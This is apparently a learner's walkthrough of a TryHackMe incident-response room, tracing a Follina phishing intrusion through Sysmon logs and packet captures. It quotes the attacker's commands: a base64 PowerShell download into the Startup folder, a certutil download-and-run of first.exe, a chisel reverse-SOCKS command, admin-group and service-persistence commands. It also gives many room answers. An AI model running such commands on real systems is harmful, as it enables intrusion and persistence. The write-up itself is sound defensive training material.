This is a room where according to tryhackme is a purple-team focused room. My opinion at the end.


For this room it was important to have a bit of background of Windows Event Logs, Sysmon, Wireshark, and Brim.

We start the THM's VM.

We get some info refreshment from THM on log analysis, and event correlation.

->->->->->->=>=>=>->->->=>=>=>

By task 3 - Preparation, we get a step of analysing files hashes. We do the powershell command "get-filehash -algorithm sha256 .\file.pcapng" (the file in this case was a sample, but you catch the drift).


I decided to use the steps shown after, which was parsing provided logs (evtx logs) into .csv logs, then feed it into timeline explorer, and then turn it into xml to put it on sysmon-view.
But! Let's start easy...


First with convert the sysmon evtx log into csv log. We use one of the EZTools, which is EvtxEcmd that converts evtx files into CSV, JSON, and XML, etc...
We do the following command:

	-> .\evtxecmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv


We got now our .csv log "sysmon.csv" in the path "C:\Users\user\Desktop\Incident Files"


You can check the .csv file on TimelineExplorer (this is pinned in the taskbar of the VM).


We see that we get some info about sysmonview, which is a windows GUI-based tool that visualises sysmon logs. However, the log file has to be exported into xml via event viewer.

I did this by opening the event viewer (TryHackMe Guide says this as well).

So, in the event viewer, I clicked on "Open Saved Log", opened the sysmon.evtx, after that, saved that as .xml file. 

Now you can open sysmon view, and check the xml by clicking on the left top corner where it says "File" then "Import sysmon event logs" and select the .XML file that was just saved.





For the questions, remember the checking hash powershell command? Well, do that with the requested files. And BOOM!



==========================================================================================


Now for TASK 4; we get a task sort of context for the questions asked in here.

In this incident, you will act as an Incident Responder from an alert triaged by one of your SOC analysts. The Analyst has confirmed the alert has a CRITICAL severity that needs further investigation.

As reported by the SOC analyst, the intrusion started from a malicious document. In addition, the analyst compiled the essential information generated by the alert as listed below:
	- The malicious document has a .doc extension
	- The user downloaded the malicious document via chrome.exe
	- The Malicious document then executed a chain of commands to attain code execution


Investigation Guide cheatsheet given by THM consists of: 
	- Start with the events generated by Sysmon
	- EvtxEcmd, Timeline Explorer, and sysmonview can interpret sysmon logs.
	- Follow the child processes of WinWord.exe
	- Use filters such as ParentProcessID or ProcessID to correlate the relationship of each process.
	- We can focus on Sysmon events such as Process Creation (EventID 1), and DNS queries (EventID 22) to correlate the activity generated by the malicious document.

Signifcant Data Resources:
	- Sysmon.


------
Q1*
For the question one I jumped into Brim, since the document was downloaded via chrome. There should be something in the pcapng file we are given. We slap that in Brim; I wrote ".doc" in the searchbar
and focused on the "http" packet. And I found the malicious document in the log details fields, which is "free_magicules.doc" from the host "phishteam.xyz" among other fields you can explore.

------
Q2*
For the second question, asking us what is the name of the compromised user and machine. 

So I jumped into the Event Viewer, and by using 'Ctrl+F', I found benimaru username downloaded the "free_magicules.doc" file, as per answer format requested, I input "username-computer".
I explored if I could retrieve this answer through Brim, and yes, you can. As you put the "sysmon.csv" file, you query "free_magicules.doc", and eventually you will find the information needed.


Anyways...

------
Q3*
To the third question. "What is the PID of the Microsoft Word process that opened the malicious document?".

So, I, this time, queried "magicules" on the Event Viewer, and upon inspection, I checked the details of a process which had the image 'Microsoft Office', and a funny 'winword' executable.
So I took its PID. And that was the answer, indeed.



-----
Q4*
Now the fourth question asks "Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?"

I used Brim for this, queried the host which the compromised user downloaded the malware from, then checked the details of the response_host, it has the IPv4 address there, and that is the answer.




-----
Q5*
Now the fifth question asks "What is the base64 encoded string in the malicious payload executed by the document?

So, I hopped-on Timeline explorer, inserted the "sysmon.csv" file, and queried "base64" for time saving purposes, and luckily obtained one item; opened it, getting the cell content.
Then I retrieved the base64 coded payload.

As for the purposes of ease, I decided to put the code in here, but I honestly recommend replicating the steps before-mentioned to better learning experience.
base64code = [JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==]

-- extra step =[ If you want, you could go to cyberchef, or any base64decoder, and thus decode that, so you understand what is the intent/behaviour behind this ] --

-----
Q6*
What is the CVE number of the exploit used by the attacker to achieve a remote code execution?

For this I took the THM's hint, remember the previous question? Well, take the information from there as guidance, then I simply 'googledorked' the following query; "msdt.exe+PID 496+*CVE"
Then I found about the Follina vulnerability, thus the CVE in question. For the answer format, do not include "CVE".



==========================================================================================================================

TASK 5

In here we have found that there is a stage 2 execution:
	*- The document has successfully executed an encoded base64 command.
	*- Decoding this string reveals the exact command chain executed by the malicious document.

THM provides an investigation guide (cheatsheet) ->
	|
	|-> WITH THE FOLLOWING DISCOVERING -> we may refer again to the cheatsheet to continue with the investigation:
		*- The Autostart execution reflects explorer.exe as its parent process ID.
		*- Child processes of explorer.exe within the event timeframe could be significant
		*- Process Creation (EVENT ID 1), and File Creation (EVENT ID 11) succeeding the document execution are worht checking.
	&& - significant data source:
		*- Sysmon

-----
Q1*
The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?

For this, I tried copying the prior decoded base64 payload we found...
However, it was not it!
I googled "$app+windows+appData Location" (This because of the hint offered by THM), found the default location of the AppData (without the appdata variable).

Default path -> "C:\Users\<username>\AppData\"

Now all we have to do is to put the puzzle pieces all together, these being.
	|
	| --->  (*) username - [ remember the compromised username ]
		(*) full path - [ laid out for us in the base64 decoded payload ]

Now we have the answer!

------
Q2*

The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?

I went to the Timeline explorer, and queried "explorer.exe" which would be the parent event of it. Explorer.exe.
I went to the table field "Executable info", and a powershell command execution in there caught my attention. Since TryHackMe, wants the format without the double quotes, I input it as requested.


Answer {

	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; 
	C:\Users\Public\Downloads\first.exe
	
}


------
Q3*

Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?

For this step, I decided to query (mind you, still in Timeline explorer) "first.exe", which is the second stage execution. Using the field "payload data3" in correlation with "executable info"
I contrast the information up to the logical match, click on the "payload data3" so you can expand the field, and thus obtain the answer to the question.


-------
Q4*

The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?
[ Format =  domain:port ]

For this I simply remained on the querried "first.exe", however, I filtered the DNS query request, and obtained the Domain. As for the port, I simply guessed it was port 80.
However, use brim or wireshark, and contrast this information with the beforementioned domain information. I took some extra time to do this with Brim.
I then decided to move to wireshark with this information for further analysis of the pcap file. I searched for "ip.address == 192.168.254.107" then CTRL+F [click on filter 'string'] -> first.exe
you can see the consistency of packet exchange's persists on port 80.


=====================================================================================================================================================



TASK 6

--- MALICIOUS DOCUMENT TRAFFIC

Based on the collected findings, we discovered that the attacker fetched the stage 2 payload remotely:
	*- Domain, and IP invoked by the malicious document on sysmon logs.
	*- There is another domain, and IP used by the stage 2 payload logged from the same data source.


Now we are given an Investigation Guide by THM.
	|
	|()--> So we are told to focus on the cheatsheet, which focuses on Network Log Analysis.
		
		*- We can now use Brim, and Wireshark (according to THM, as if I haven't been using it, lol) to investigate the packet capture.
		*- Find network events related to the harvested domains, and IP addresses.
		*- Sample Brim filter that you can use for this investigation: `_path=="http" "<malicious domain>"`
	Data source:
		*- Packet Capture



------------
Q1*
What is the URL of the malicious payload embedded in the document?

So a little reminder, we have two malicious domains being:
				---> phishteam.xyz
				---> resolvecyber.xyz
	


So I decided to go based on the query sample from THM, on Brim.
`_path=="http" "phishteam.xyz" | sort ts`

The first one's URI field looks interesting, due to containing the malicious document we've sighted before.
I honestly struggled for a minute on Brim, so I tried on WireShark instead. 
with the query:
	|||------> http.host == "phishteam.xyz" && http.request.method == "GET"

Perhaps because everything seemed more compact I didn't have too much struggle with this option. However, I tried when the user GETs the literal malicious file. But that was not the answer for THM
then I opted to input the "/index.html" instead, and that was accepted as the answer by TryHackMe.


-------------
Q2*
What is the encoding used by the attacker on the c2 connection?

So in WireShark I used:
		----> "http.host == "resolvecyber.xyz" && http.request.method == "GET" && ip.dst == 167.71.222.162"

Changed the host from past domain, since in the previous question while using Brim, I checked the second domain first, and noticed it was all encoded, so I passed to the first one, hence obtaining
the previous answer. Anyways, remembering the uri traffic was encoded, I used it, then retaining the previous http request method, and adding up the IP destination (affected user), this could be
observed in the analysis from the previous question as well.


--------------
Q3*
The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?

We can observe that it is "q" from the previous analysis process we performed.

--------------
Q4*
The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?

In reality THM's want you to add a directory only, not the whole URL, but based on the question, you should focus on finding an activity involving an URL.
So for this, I simply continued on WireShark, based on the query used in Question 2, filtered timeline, and got the first one (I also remembered a constant directory with the http directory) - 
(you can check and connect the dots with the other activities with the C2 server, and notice the constant /directory).



---------------
Q5*
What is the HTTP method used by the binary?

Not moving anything from the last question, you can get this as well. Which is:
"GET"


---------------
Q6*
Based on the user agent, what programming language was used by the attacker to compile the binary?

This one is quite easy, so I will say, still not moving a thing, investigate (even the first packet, if you still have the time filter on, from previous question), you can see the answer there.

SPOILER:
||Nim||


==============================================================================================================================

TASK 7


INTERNAL RECONNAISSANCE

Now we know:
	|-> We can easily decode the encoded string in the network traffic (base62 encoded)
	|-> The traffic contains the command, and output executed by the attacker.


Investigation Guide -
	/|\
	\|/
	|||
	|||
	|→→→→→ find network and process event connection to the malicious domain.
	|→→→→→ find network events that contain an encoded command
	|→→→→→ usage of Brim can be done, filter all packets containing the encoded string.
	|→→→→→ look for endpoint enumeration commands since the attacker is already inside the machine.

Additional information:
	→→→ to get all `http` requests related to the malicious C2 traffic: 
				|
				|→→→→→→→→ [_path=="http" "domain" id.resp_p=="port" | cut ts, host, id.resp_p, uri | sort ts]


Significant Data Sources:
	(*)- Packet Capture
	(*)- Sysmon


------------
Q1*

The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?



So, for this step you can use the query offered by THM, on Brim, and of course, fill the correspondent fields.
Then copy all the strings into cyberchef or base64 decoder, decode it, and you'll get the answer right there. 

I created a whole document [malicious-strings.md] with the base64 decoded strings.


--------------
Q2*


The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?

So I went back to the beforementioned document I created, and based on the ports there, I found two options. 
you can try all ports in there OR you can google which port is used in the remote shell, something like "Windows+remote shell port used"
or also "Remote server+microsoft+used port"

I honestly tried all ports which wasn't a lot, I narrowed it to the 4 digits ports and I was left with 4 ports options.
the answer was 5985.


----------------
Q3*

The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?


So for this I checked on Timeline explorer, the sysmon.csv file, based on the "ch.exe" file in the encoded strings (the document I created with all the 
decoded strings)

Once I queried "ch.exe" on Timeline Explorer. I found the command the are asking for
`C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks`


-----------------
Q4*

What is the SHA256 hash of the binary used by the attacker to stablish the reverse socks proxy connection?

Still on Timeline Explorer software, you simply navigate to "payload data3" field, and you'll find the answer.

8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451


------------------
Q5*

What is the name of the tool used by the attacker based on the SHA256 hash?

I used VirusTotal and analysed the hash, hence obtaining the answer.


-----------------
Q6*

The Attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service
did the attacker use to authenticate?

So I pretty much went with a hunch on this one. 
I threw "winrm" which is windows remote management, because the machine hacked was windows, and plus from pentest rooms I've performed before
this is what I used.

================================================================================================================================================

TASK 8

PRIV-ESC
	-> Based on the collected findings, the attacker gained a stable shell through a reverse socks proxy.


Investigation Guide:
	|
	|---> Focus on the network endpoint events:
		(*)--> Look for events executed after the successful execution of the reverse socks proxy tool.
		(*)--> Look for potential privilege escalation attempts, as the attacker has already established a persistent low-privilege access.

Significant Data Sources:
	\\\~~~> Packet Capture
	\\\~~~> Sysmon


Now we get going :)

------------
Q1~

After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?


I checked my file with the base64 decoded strings, because I remembered that there's a powershell command (one-liner), contrasted this on Brim, I queried "powershell".
I found a packet with an executable file, which is different from the ones seemed before, so this is it. 

`spf.exe` is the file.

I went to Timeline explorer, and queried "spf.exe" focused on the "Executable Info" field, I found `C:\Users\benimaru\Downloads\spf.exe" -c C:\ProgramData\final.exe` command.
I searched this on Event Viewer as well, I googled around to confirm my thought, that this spf.exe file was a script to configure/trigger final.exe execution.

Anyways, I then checked "payload 3 data" and retrieve the SHA256 hash. So `spf.exe` along with its SHA256 hash, is the answer.

(Apologies if I dragged this a bit, but I wanted to investigate on my own, and further investigate, analyse and confirm certain stuff I had on my mind).

SHA256=`8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D`

---------------
Q2 ~

Based on the SHA256 hash of the binary, what is the name of the tool used?


So for this, I went to VirusTotal and inserted our found SHA256, then obtaining the name. 

I tried inputting the whole name, and without the ".exe" part, but I kept getting the answer wrong, so I did it without the number it has. And that was it!
SMFH...



------------------
Q3 ~

The tool exploits a specific privilege owned by the user. What is the name of the privilege?


Google dork this one

You know what? I'll give it to ya... here ya go :P

SeImpersonate privilege.



------------------
Q4~

Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?


Okay, this was easy, I remembered the command I "dragged" from the start. Investigating has its pros!
Anyways, ring any bells?! Well, there you go, mate.


------------------
Q5~

The binary connects to a different port from the first c2 connection. What is the port used?

I queried "final.exe" on Brim, and got the packet, connecting to port 80.
answer: Hmmm, somehow just repeat it twice because the format is ****. So it'd be 8080. 

For FYI, both are different ports, the latter is used as an alternative of the default 80 port for HTTP traffic. Google this further so you understand more
about the topic.




====================================================================================================================

TASK 9


Fully-Owned Machine

Now, the attacker has gained administrative privileges inside the machine. Find all persistence techniques used by the attacker.

In addition, the unusual executions are related to the malicious C2 binary used during privilege escalation.

Investigation Guide

Now, we can rely on our cheatsheet to investigate events after a successful privilege escalation:

    - Useful Brim filter to get all HTTP requests related to the malicious C2 traffic : _path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts

    - The attacker gained SYSTEM privileges; now, the user context for each malicious execution blends with NT Authority\System.

    - All child events of the new malicious binary used for C2 are worth checking.

Significant Data Sources:

    -Packet Capture
    -Sysmon
    -Windows Event Logs



----------------
Q1~


Upon achieving SYSTEM access, the attacker then created two users. What are the account names?


So I used Timeline Explorer for this one, queried "final.exe", and filtered eventID 1 (process creation eventID).
Based on "Executable Info" field, you can see the users added.

shion,and shuna.



-------------------
Q2~

Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt.
What is the missing option that made the attempt fail?

Once again, in Timeline Explorer, you can organise by filtering the timestamp (however you feel comfortable with), analyse, and observe the command history.

So I saw "/add" was the missing part when the attacker 'failed' to execute the desired command.




---------------------
Q3~

Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?

I googled this one, pretty easy. 

C'mon you can do it...

Anyways, the answer is 4720.



-----------------------
Q4~

The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?

Ha! Timeline explorer is our best source in this one (again). 

I'm back on Timeline explorer, mind you, I haven't cleared the "final.exe" query, the timeline filter, nor the event ID 1.

So I find this in the "executable info" field:

	`C:\windows\system32\net.exe localgroup administrators /add shion`



and then I put it on as the answer, but it's wrong, I decide to put simply:

	`net localgroup administrators /add shion`




-------------------------------
Q5~

Based on windows event logs, the account was successfully added to a sensitive group. 
What is the event ID that indicates the addition to a sensitive local group?


Googledork this one, mate.



-------------------------------
Q6~


After the account creation, the attacker executed a technique to establish persistent administrative access.
What is the command executed by the attacker to achieve this?


One more time!... :P
Timeline explorer to save the day! Focus on the "executable info" field. 
I compared the two commands, and it only changes from "TempestUPdate" to "TempestUpdate2".

I did go with:
`C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate binpath= C:\ProgramData\final.exe start= auto`

TryHackMe changes it to the latter choice, I don't know why, but I'd rather put emphasis on the first one (because it is the root of this evil :P).



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   ~~~ ~~~ ~~~
~~~~  ~~~~  ~~~~  ~~~~
~~~ ~~ ~
~~~

And well, that's all folks! :)
This was fun to me, I enjoyed the room, I took my time, perhaps days, because of personal reasons. But overall it was good!
I'd totally recommend to take your time and investigate around. There's no bad on googling for certain stuff. 

I'd also suggest to google some walkthroughs beside other information, and I'd say the walkthroughs that show you the process to obtain the answer.
And do your best to repeat the process, or if you have a different method to obtain the same answer, then go for it, because that's how I did. 


For some answers, I completely contrasted this with one walkthrough I found that didn't contain the answers explicitly, just the process to obtain it.
I found myself in certain answers, doing a completely different method, but obtaining the answer anyways. 
And by completely different method, I want to clearify, that it might have been using a different tool from what was used in the walkthrough.
Two extra steps, or just one less step that the walkthrough, nothing major. 
What I want to say with all this is, there's nothing wrong on checking other sources. 






